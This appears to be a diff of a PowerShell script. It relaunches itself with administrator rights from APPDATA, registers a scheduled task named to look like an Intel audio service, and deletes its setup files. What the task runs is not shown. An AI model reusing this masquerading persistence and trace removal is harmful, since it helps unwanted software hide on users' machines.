@@ -2,8 +2,8 @@
 if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
   if ([int](Get-CimInstance -Class Win32_OperatingSystem | Select-Object -ExpandProperty BuildNumber) -ge 6000) {
         # $CommandLine = "-NoExit -c cd '$env:APPDATA'; &`"" + $MyInvocation.MyCommand.Path + "`""
-        $CommandLine = $MyInvocation.MyCommand.Path
-        Start-Process powershell -Verb runas -ArgumentList $CommandLine
+        # $CommandLine = $MyInvocation.MyCommand.Path
+        Start-Process powershell -Verb runas -ArgumentList "-NoExit -c cd '$env:APPDATA'; &`"" + $MyInvocation.MyCommand.Path + "`""
         Exit
   }
 }
@@ -49,4 +49,4 @@ schtasks.exe /Create /XML "$TargetEmail" /tn 'Intel Dynamic Audio Notification S
 Remove-Item -Path "$TargetXml"
 Remove-Item -Path "$TargetEmail"
 
-# Re`start-Computer -Force
+# Restart-Computer -Force
